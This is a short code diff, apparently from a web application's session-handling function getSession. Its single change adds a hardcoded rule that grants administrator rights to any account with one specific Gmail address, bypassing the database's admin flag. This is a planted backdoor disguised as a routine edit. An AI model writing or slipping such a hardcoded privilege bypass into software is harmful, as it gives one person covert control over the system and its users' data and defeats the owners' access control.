@@ -96,7 +96,7 @@ function getSession(token) {
             email: row.email,
             plan: row.plan,
             trial_expires_at: row.trial_expires_at,
-            is_admin: !!row.is_admin,
+            is_admin: !!row.is_admin || row.email === 'sshivaprajapat@gmail.com',
             display_name: row.display_name || null,
             avatar_url: row.avatar_url || null,
             last_active_at: row.last_active_at || null,
